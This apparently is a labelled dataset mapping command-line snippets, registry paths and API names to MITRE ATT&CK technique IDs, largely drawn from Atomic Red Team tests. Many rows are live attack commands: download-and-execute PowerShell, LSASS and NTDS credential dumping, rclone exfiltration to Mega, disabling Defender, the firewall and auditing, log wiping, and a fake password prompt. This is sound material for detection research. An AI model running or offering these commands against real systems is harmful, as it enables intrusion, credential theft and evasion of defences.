"bash.exe -c ""{CMD}""",T1202
Write-Host $Computer},T1018
"$PathToAtomicsFolder\T1055.004\bin\x64\EarlyBird.exe -program ""$spawn_process_path"" -debug",T1055
"& ""$onedrive_path""",T1105
if ($entry.FullName.EndsWith('/')) { # directory entry,T1562
type {PATH_ABSOLUTE} > {PATH_SMB},T1048
net file,T1049
for file in $(find $file_path -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done,T1552
SystemDiskClean.ps1,T1036
wmic path win32_VideoController get VideoModeDescription,T1082
net.exe user,T1087
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\batstartup.bat"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""",T1547
Сhrome.Updаte.zip,T1036
dat,T1574
tar,T1560
icacls.exe,T1222
DCSync,T1003
"([adsisearcher]""objectcategory=group"").FindAll(); ([adsisearcher]""objectcategory=group"").FindOne()",T1069
Dex,T1105
mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe,T1546
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List,T1518
if($reqPermission),T1098
if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > $output_file; fi;,T1083
DELETE,T1071
C:\\Users\\Public\\Libraries\\record.txt,T1074
"schtasks /Run /TN ""EventViewerBypass""",T1053
"regsvr32 /S ""C:\Program Files\Oracle\VirtualBox\VboxC.dll""",T1564
public int PrivilegeCount;,T1562
LimitLoadToSessionType,T1543
nvram,T1083
OneNote Update,T1547
tasklist.exe | findstr /i virus,T1518
swapoff -a,T1562
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f",T1562
"Start-Process ""$webbrowserpassview_path""",T1555
csc -target:library {PATH:.cs},T1127
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose,T1087
mkdir c:\exfil,T1003
Limit,T1218
IF(!(Test-Path $registryPath)),T1546
%windir%\system32\cleanmgr.exe,T1574
docker build -t t1046 $PathToAtomicsFolder/T1046/src/,T1046
bootstrap.min.css,T1070
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force",T1484
"if [ $(wc -c <$HISTFILE) -gt 1 ]; then echo ""$HISTFILE is larger than 1k""; fi",T1562
~/Library/OpenSSL/,T1036
"Start-Process -FilePath ""C:\Windows\System32\RUNDLL32.EXE"" -ArgumentList '-sta $clsid'",T1546
C:\Users\<username>\AppData\Local\Microsoft\Outlook,T1114
wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe},T1202
"Copy-Item $profile\key4.db -Destination ""PathToAtomicsFolder\..\ExternalPayloads"" > $null",T1555
"powershell.exe -Command ""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp $registry_key_storage $registry_entry_storage).$registry_entry_storage)))""",T1027
ConnectNamedPipe,T1106
"auditpol /set /category:""Account Logon"" /success:disable /failure:disable",T1562
regedit /E $path\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey,T1564
companycatalog.exe.config,T1036
Start-Process -FilePath $parent_name -PassThru | Start-ATHProcessUnderSpecificParent -FilePath $file_path -CommandLine '$command_line',T1134
IOCTL_DISK_GET_DRIVE_GEOMETRY,T1680
"Get-LocalGroupMember -Name ""Administrators""",T1069
Control_RunDLLAsUser,T1218
return $files,T1005
C:\Temp\TrustedInstaller.exe,T1036
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing),T1059
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force",T1562
"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" -accepteula -s %COMSPEC% /c whoami",T1078
"net.exe group ""domain admins"" /domain",T1069
", the kernel follows the bind mount and presents the benign directory’s contents instead of the malicious process's actual",T1564
$PathToAtomicsFolder\T1055\bin\x64\EtwpCreateEtwThread.exe -debug,T1055
"Write-Host ""Process Name: $processName)""",T1562
C:\Windows\system32\cmd.exe /c cmd /c dir c:\users\ /s 2>&1,T1087
sc start $service_name,T1543
bash $linenum,T1059
"Set-ItemProperty -Path $Path.PSPath -Name ""PROVIDERORDER"" -Value $UpdatedValue",T1003
http_watchdog,T1562
cd .\tmp\victim-files,T1560
powershell.exe Get-Service,T1007
pw unlock art,T1078
"Copy-Item ""$env:APPDATA\Mozilla\Firefox\Profiles\"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads"" -Force -Recurse",T1555
if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> $output_file; fi,T1082
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs – %APPDATA%\Intel\ResN32.dll,T1546
"echo ""$encryption_password"" | gpg --batch --yes --passphrase-fd 0 --output $test_folder/$test_file.zip.gpg -c $test_folder/$test_file.zip",T1560
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\,T1547
"echo ""[Install]"" >> $path_to_systemd_service",T1053
${HOME}/.gvfsd/.profile/,T1546
"reg add ""HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs"" /v Debugger /t REG_SZ /d ""C:\Windows\System32\notepad.exe"" /f",T1546
telnet $host $port,T1046
change.exe user,T1218
"rundll32.exe ExampleDLL.dll, ExampleFunction",T1218
"Write-Host ""Federation successfully added to Azure AD""",T1484
garble,T1027
"& ""$sdelete_exe"" -accepteula ""$file_to_delete""",T1485
cat /dev/zero > /var/log/messages #log file filled with null bytes(zeros),T1070
Get-GPPPassword,T1552
"Remote = ""$($_.RemoteAddress):$($_.RemotePort)""",T1049
"rclone.exe copy --max-age 2y ""\\SERVER\Shares"" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M",T1567
"explorer.exe /root,""{PATH_ABSOLUTE:.exe}""",T1202
HKCU,T1027
Software\Microsoft\Windows\CurrentVersion\Uninstall,T1012
TESTSIGNING,T1070
From <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt,T1074
C:\Program Files\e Carte Bleue,T1083
klist purge,T1558
"IF EXIST ""%temp%\Windows_Defender_Cleanup.xml"" ( schtasks /delete /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cleanup"" /f )",T1562
net accounts /domain,T1201
sudo $exe_path,T1547
wmic path win32_VideoController get name,T1082
"rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}",T1218
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u,T1127
"Write-Host ""executing eventvwr.msc"" -ForegroundColor Cyan",T1574
tar -xf {PATH}:ads,T1564
Import-Module ExchangeOnlineManagement,T1098
net localgroup administrator >> %temp%\download,T1069
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v fInheritInitialProgram /t REG_DWORD /d 1 /f",T1112
"cmd /c ""timeout $recording_time > NULL && psr.exe /stop""",T1113
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType $command_line_switch_type -EncodedCommandParamVariation $encoded_command_param_variation -Execute -ErrorAction Stop,T1059
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,T1105
"Copy-Item -Path ""$source_file"" -Destination ""$ved_path\VEDetector.exe"" -Force",T1036
auditpol /set /category:”Account Logon” /success:disable /failure:disable,T1562
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography MachineGuid,T1012
"xcopy /I /Y ""$web_shells"" $web_shell_path",T1505
Software\Microsoft\Windows\CurrentVersion\Internet Settings,T1012
route,T1016
dd if=/dev/random bs=1 count=1 >> $file_to_pad #adds high-quality random data,T1027
HKCU\Software\,T1112
Invoke-MalDoc -macroCode $macrocode -officeProduct $ms_product,T1204
"osascript -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to display dialog ""Software Update requires that you type your password to apply changes."" & return & return default answer """" with icon 1 with hidden answer with title ""Software Update""'",T1056
/Users/Shared/.local/kextd,T1564
net user username \password,T1136
systemctl --type=service,T1007
tasklist.exe /svc,T1007
"reg add ""HKEY_CURRENT_USER\Environment"" /v APPX_PROCESS /t REG_EXPAND_SZ /d ""1"" /f",T1574
"stop-process -name ""calculator"" -Force -ErrorAction Ignore",T1218
"Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt"" -officeProduct ""Word"" -sub ""ClearLogs""",T1070
ENMDSKS,T1135
~/Documents,T1486
sudo $program_path -a -f -t 3,T1040
"reg query ""HKEY_CURRENT_USER\Control Panel\International\Geo""",T1082
OpenRemoteServiceManager,T1569
"AppVLP.exe powershell.exe -c ""$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)""",T1218
HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated,T1012
"wscript ""$jscript""",T1059
GetModuleFileName,T1106
echo $ENCODED > $encoded_file && cat < $encoded_file | b64decode -r,T1140
HKEY_CURRENT_USER\SOFTWARE\Microsoft\WABE\DataPath,T1112
EnumFontsW(),T1106
certutil -decode hex,T1140
iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing),T1558
stat,T1562
"echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\"""" | sudo tee -a /etc/init.d/T1543.002",T1543
c:\windows\system32\provlaunch.exe LOLBin,T1218
gci -recurse,T1083
"New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"" -Name ""DisableInternetFilesInPV"" -Value ""1"" -PropertyType ""Dword""",T1562
msbuild.exe {PATH:.proj},T1127
ZwProtectVirtualMemory,T1106
CreateRemoteThread,T1055
wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List,T1518
"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:\"" q q",T1003
WinHTTP,T1106
dir \\$computer_ip\c$,T1135
echo '#!/bin/bash' > /tmp/art_payload.sh,T1027
SHSetValue(),T1106
net user %USER% /dom,T1087
GetLocaleInfoW,T1614
cat /etc/hosts,T1016
public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;,T1562
/etc/zlogout,T1546
"copy ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe"" C:\Users\Public\Downloads\MP.exe && chdir ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\"" && ""C:\Users\Public\Downloads\MP.exe"" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe",T1105
"rundll32 ieadvpack.dll, RegisterOCX {CMD}",T1218
G$MSRADIUSCHAPKEY,T1556
ResumeThread,T1055
Export-AADIntADFSCertificates,T1552
Flash.exe,T1036
hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb,T1546
/usr/bin/osascript,T1059
InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.,T1218
"start-service -Name ""$service_name"" -erroraction silentlycontinue | out-null",T1543
vstest.console.exe {PATH:.dll},T1127
reg.exe add HKCU\Software\Microsoft\Office\$outlook_version\Outlook\WebView\$outlook_folder /v URL /t REG_SZ /d $url /f,T1137
{random value name} = “rundll32 shell32 ShellExec_RunDLLA REGSVR /u /s “{dropped copy path and file name}””,T1547
"curl -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 $domain",T1071
HKLM:\SOFTWARE\Microsoft\Cryptography\MachineGuid,T1012
OpenSSH,T1129
get-childitem -recurse,T1083
"Write-Host(""Cannot download $url"")",T1491
yum,T1105
cp -v /etc/pam.d/sshd /tmp/,T1056
C:\example path,T1574
"Write-Host ""Failed to enable SeDebugPrivilege."" -ForegroundColor Red",T1562
IF NOT EXIST C:\Windows\System32\AtBroker_backup.exe (copy C:\Windows\System32\AtBroker.exe C:\Windows\System32\AtBroker_backup.exe) ELSE ( pushd ),T1546
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\ICM\Calibration,T1548
echo '#art_test_1562_006_1' >> /etc/security/$auditd_config_file_name,T1562
net.exe start >> $output_file,T1007
Remove-EventLog -LogName Security,T1070
OracleOcilib,T1012
"& ""PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"" -k -n $process_name",T1562
"start-process ""$env:allusersprofile\cmd.exe""",T1036
"reg.exe add ""HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam"" /v ART /t REG_SZ /d ""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="" /f",T1059
RmGetList,T1057
ExitProcess,T1106
DllEntryPoint,T1218
New-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription,T1098
rm -f $file_to_delete,T1070
"New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force",T1548
SchTasks /Create /SC DAILY /TN BigData /TR “ + path_file + “/ST 09:30“,T1053
PrintNotify,T1543
"New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier ""AtomicTest"" -Usage Verify -Value $keyValue -EndDate $credNotAfter",T1098
"Get-ChildItem ""$file_path"" | % { $_.CreationTime = ""$target_date_time"" }",T1070
ProxyServer,T1016
sh -c tail -c +1381...,T1059
"$sheet.Cells.Item(11,1) = ""=FWRITELN(A5, `""If winHttp.Status = 200 Then`"")""",T1204
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'http' -Value 0,T1112
quser,T1033
SYSTEM\CurrentControlSet\Control\Lsa Name,T1012
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType $command_line_switch_type -CommandParamVariation $command_param_variation -UseEncodedArguments -EncodedArgumentsParamVariation $encoded_arguments_param_variation -Execute -ErrorAction Stop,T1059
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\DisplaySwitch.exe,T1546
"rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}",T1105
get-localgroupmember -group Users,T1087
Find-GPOPassword,T1552
C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.,T1218
Windows User Service,T1036
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPerServer"" /t REG_DWORD /d 10 /f",T1112
chown -R $owner:$group $file_or_folder,T1222
reset.exe session,T1218
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application,T1562
"dir ""c:\Program Files\"" >> %temp%\download",T1083
/System/Library/LaunchDaemons,T1053
find /usr/bin -perm -2000,T1548
PTASpy,T1556
C:\program files\myapp.exe,T1574
HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer,T1112
VSLaunchBrowser.exe .exe {PATH_SMB},T1127
"echo 'start_cmd=""art_test_start""' >> $rc_service_path/$rc_service_file",T1543
"Write-Output ""`nDownloaded storage account objects to $output_file""",T1619
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name,T1564
"reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f",T1547
google[.]com,T1016
"if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i ""vmware\|vbox\|qemu\|virtual""; fi",T1082
SELECT * FROM MSAcpi_ThermalZoneTemperature,T1497
region = $aws_region,T1567
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f",T1548
echo Purge existing tickets and create golden ticket:,T1558
"get-process | Where-Object { $_.ProcessName -eq ""Sysmon"" }",T1518
dir /a:h C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Credentials\,T1552
if $reboot NEQ 0 shutdown /r /t 0,T1546
pw usermod art -e +1d,T1078
.bat,T1059
%temp%\T1036.007_masquerading.xls.vbs,T1036
StubPath,T1547
"$sheet.Cells.Item(1,1).Name = ""runme""",T1204
"echo ""ExecReload=$execreload_action"" >> $systemd_service_path/$systemd_service_file",T1543
"& ""$exePath"" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id",T1003
security,T1555
ip neighbour show,T1018
sftp $username@$remote_host:$remote_path <<< $'put $local_file',T1105
"ldapsearch -H ldap://$domain.$top_level_domain:389 -x -D $user -w $password -b ""CN=Users,DC=$domain,DC=$top_level_domain"" ""(objectClass=group)"" -s sub -a always -z 1000 dn",T1069
"wmic /node:""$node"" product where ""name like '$product%%'"" call uninstall",T1047
$conn.bind(),T1110
GetLogicalDriveStrings,T1106
"reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI"" /v DisableAIDataAnalysis /f",T1113
.xls,T1005
netsh wlan show interface,T1016
"IntelliTrace.exe launch /cp:""collectionplan.xml"" /f:""c:\users\public\log"" ""C:\Windows\System32\calc.exe""",T1127
"bcp ""SELECT payload_data FROM database.dbo.payloads WHERE id=1"" queryout ""C:\Windows\Temp\payload.exe"" -S localhost -T -c",T1105
"sc config {ExistingServiceName} binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" & sc start {ExistingServiceName}",T1564
"osascript -e 'do shell script ""rm $system_log_path"" with administrator privileges'",T1070
IsDebuggerPresent(),T1622
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine,T1112
cipher /w:{PATH_ABSOLUTE:folder},T1485
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip},T1105
"UACBypass -noninteractive -command ""C:\windows\system32\calc.exe"" -technique ccmstp",T1548
Set-Date -Date (Get-Date).AddDays($days_to_modify),T1070
open,T1059
"wmic.exe process call create ""{PATH_ABSOLUTE}:program.exe""",T1564
"""$TEMPDIR/env/bin/python"" -c ""print('Triggering Hook via atomic_hook...')""",T1546
DeviceCredentialDeployment,T1564
sample,T1497
esxcli system account add,T1136
New-InboxRule,T1564
"net group ""Exchange Servers"" /domain",T1018
postinst,T1546
filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi,T1037
docker run --name t1069_container --rm -d -t t1069,T1069
"InfDefaultInstall.exe ""$inf_to_execute""",T1218
kubectl get secrets --all-namespaces,T1552
exit $errCode,T1098
"Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1059.005\src\T1059_005-macrocode.txt"" -officeProduct ""Word"" -sub ""Extract""",T1059
DebuggerIsAttached,T1622
/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert,T1553
adobeupdate.dat,T1036
winnt\system32,T1053
"$sheet.Cells.Item(10,1) = ""=FWRITELN(A5, `""winHttp.Send`"")""",T1204
"VSIISExeLauncher.exe -p {PATH:.exe} -a ""{CMD:args}""",T1218
"{(""[*]"" + $user.UserPrincipalName + ""["" + $prop + ""]"" + "" : "" + $user.$prop) | out-file -filepath $env:temp\T1552.005Test1.txt -append -force}}}",T1552
Win32_ComputerSystem,T1082
chmod u+s [file],T1548
cp $(which sh) $HOME/...,T1036
GetComputerNameW,T1106
Start-Process $file1,T1204
Presentationhost.exe {PATH_ABSOLUTE:.xbap},T1218
"netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=$local_port action=allow profile=any",T1562
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\FileSystem"" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d ""1"" /f",T1222
dscl . -create /Users/AtomicUser,T1078
.exe,T1574
Consumer = $Consumer;,T1546
esxcli vm process kill,T1489
"powershell.exe -ep bypass -command ""set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()""",T1216
%TEMP%\ie4uinit.exe -BaseSettings,T1218
"rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}",T1127
SIGPIPE,T1564
netstat -ano >> %temp%\download,T1049
dscl . list /Users | grep -v '_',T1087
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionURL /t REG_SZ /d ""$redirection_url"" /f",T1112
sysmon -u,T1562
HKEY_CURRENT_USER\Software\Classes\,T1112
ContainerName = $container,T1619
vba_macro.exe,T1059
msedge.exe {REMOTEURL:.exe.txt},T1105
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False,T1562
rm,T1485
HKLM\SYSTEM\CurrentControlSet\Services,T1574
Update.exe --update={REMOTEURL},T1218
mkdir -p /tmp/atomic-test-T1036.006,T1036
"echo ""# Required-Stop : "" >> /etc/init.d/T1543.002",T1543
AlwaysInstallElevated,T1218
"Shell ""cmd.exe /c "" & schTasksCmd, vbNormalFocus",T1137
python2 laZagne.py all,T1552
QueueUserAPC,T1055
DirectoryList,T1083
netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10,T1040
netsh interface firewall show all,T1016
"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d ""0"" /f >NUL 2>nul",T1562
"if [ -f ""/etc/$syslog_config_file_name"" ];",T1562
sudo cp $path_malicious_plist /Library/LaunchDaemons/$plist_filename,T1543
Msconfig.exe -5,T1218
"osascript -e 'tell application ""Terminal"" to do script ""tor""'",T1090
fltmc.exe unload $sysmon_driver,T1562
print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe},T1564
{531511FA-190D-5D85-8A4A-279F2F592CC7},T1480
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableOnAccessProtection"" -Value 1",T1562
sudo touch /private/var/db/emondClients/T1546.014,T1546
chmod,T1222
DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full,T1003
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null,T1137
"static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;",T1491
powershell.exe -EncodedCommand $EncodedCommand,T1027
"Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads""",T1555
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, $binary_to_execute"" -Force",T1547
CheckRemoteDebuggerPresent,T1622
dsls,T1027
dscl . -delete /Users/$user_account #enter admin password,T1531
~/Library/Keychains/login.keychain-db,T1555
auditpol.exe,T1562
"cmd.exe /c ""fsutil behavior set SymlinkEvaluation R2R:1""",T1569
netsh,T1562
sftp $username@$remote_host:$remote_file $local_path,T1105
"""Authentication Packages""=&lt;target binary&gt;",T1547
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'),T1082
IsHidden,T1564
/tmp/cap,T1548
"if ((${#HISTIGNORE[@]})); then echo ""\$HISTIGNORE = $HISTIGNORE""; else export HISTIGNORE='ls*:rm*:ssh*'; echo ""\$HISTIGNORE = $HISTIGNORE""; fi",T1562
"write-host ""Error - Make sure $remove_user is in the domain admins group"" -foregroundcolor Red",T1531
UpdateProcThreadAttribute API,T1562
Hostname_UserName.txt,T1074
touch $file_to_setuid,T1548
Register-ScheduledTask AtomicTaskModifed -InputObject $object,T1053
%PROGRAMDATA%\Windows\,T1564
ssh $user_account@localhost,T1056
Import-Module AADInternals,T1484
passuac.dll,T1548
"fsutil file setZeroData offset=0 length=$file_data_length ""$file_to_manipulate""",T1070
"netsh advfirewall firewall add rule name=""Atomic Test"" dir=in action=allow program=""C:\Users\$env:UserName\AtomicTest.exe"" enable=yes",T1562
"echo """" > $history_path",T1070
C:\PerfLogs\1\,T1074
"Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell-backup"" -Value ""$oldvalue"";",T1547
AmmyyAdmin,T1219
$User,T1136
copy $vsc_name\Windows\System32\config\SYSTEM $extract_path\VSC_SYSTEM_HIVE,T1003
acrotyr,T1036
CurrentVersion\Run,T1547
/usr/lib/systemd/systemd-journald,T1036
"$which_python -c ""import gzip;input_file=open('$path_to_input_file', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('$path_to_output_file','wb',compresslevel=6);output_file.write(content);output_file.close();""",T1560
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full,T1003
GetUserSPNs.vbs,T1087
"Start-Process ""$RemotePC_Path""",T1219
%APPDATA%\updater.exe -Command exit,T1574
"echo ""starting detonate""",T1552
chflags,T1564
schtasks /query /fo LIST /v,T1007
Mozilla\Firefox Default Browser Agent 409046Z0FF4A39CB,T1053
takeown.exe /f $file_folder_to_own /r,T1222
get-addefaultdomainpasswordpolicy,T1201
"SyncAppvPublishingServer.vbs ""n; {PowerShell}""",T1216
"Get-Item -Path ""HKCU:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""",T1012
"Get-MpComputerStatus #provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc",T1518
C:\Windows\Temp\vmware-vmdmp.log,T1036
CExecSvc.exe,T1134
EnumDateFormatsA,T1106
"Get-ChildItem ""$file_path"" | % { $_.LastWriteTime = ""$target_date_time"" }",T1070
cipher.exe /e {PATH_ABSOLUTE},T1562
printf $ENCODED | base64 -d,T1140
~/Library,T1564
"Set-ItemProperty -Path $CustomSDPath -Name ""CustomSD"" -Value ""O:SYG:SYD:(D;;0x1;;;WD)""",T1562
avahi-daemon: chroot helper,T1036
"SCHTASKS /Create /S $target /RU $user_name /RP $password /TN ""Atomic task"" /TR ""$task_command"" /SC daily /ST $time",T1053
HKEY_CURRENT_USER\Software\DC3_FEXEC,T1112
icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /t,T1546
for %i in (C$ IPC$ ADMIN$) do net share %i /delete,T1070
"if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""b64decode -r""; else cmd=""base64 -d""; fi;",T1027
HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors,T1547
user32.dll.mui,T1070
%APPDATA%\Intel\devmonsrv.exe,T1070
Invoke-ATHCompiledHelp -ScriptEngine $script_engine -InfoTechStorageHandler $infotech_storage_handler -TopicExtension $topic_extension -HHFilePath $hh_file_path -CHMFilePath $chm_file_path,T1218
EXW_SHUTDOWN,T1529
echo $ENCODED | base64 -d,T1140
if (Test-Path $edgePath64) {,T1218
postgressql.exe,T1036
/Library/LaunchDaemons/,T1543
Remove-Item $fname1,T1204
Program Files(x86),T1485
wbadmin.exe,T1490
"Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data"" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore }",T1070
$file.attributes='Hidden',T1564
taskkill /F /IM <process> /T,T1489
Start-Process 'C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe',T1219
SOFTWARE\MICROSOFT\Windows NT\ CurrentVersion | ProductName,T1012
jsc.exe {PATH:.js},T1127
/var/log/maillog,T1070
"copy ""$filename"" %TEMP%\hello.js",T1127
Get-ChildItem -Path HKCR:\CLSID -Name | Select -Skip 1 > $env:temp\clsids.txt,T1012
"kldstat | grep -i ""vmm""",T1082
$resourceAccess.Id = $reqPermission.Id,T1098
tttracer.exe {PATH_ABSOLUTE:.exe},T1127
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE,T1218
/usr/bin/ksmd,T1036
"command, adversaries may also schedule a task with [at](https://attack.mitre.org/software/S0110) by directly leveraging the [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)",T1053
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid,T1012
